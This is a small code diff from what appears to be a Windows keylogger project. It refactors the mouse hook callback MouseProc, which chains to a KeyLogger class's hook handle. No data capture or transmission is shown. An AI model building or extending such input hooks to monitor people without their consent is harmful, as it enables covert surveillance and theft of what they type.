@@ -17,10 +17,8 @@ LRESULT MouseHookFunction(int code, WPARAM wParam, LPARAM lParam) {
 LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam) {
 	if (code < 0)
 		return CallNextHookEx(NULL, code, wParam, lParam);
-
-	if (code == HC_ACTION /*&& m_mousecode2name.find(wParam) != m_mousecode2name.end()*/)
-	{
+	else if (code == HC_ACTION)
 		return MouseHookFunction(code, wParam, lParam);
-	}
+
 	return CallNextHookEx(KeyLogger::getInstance().m_hook_mouse, code, wParam, lParam);
 }
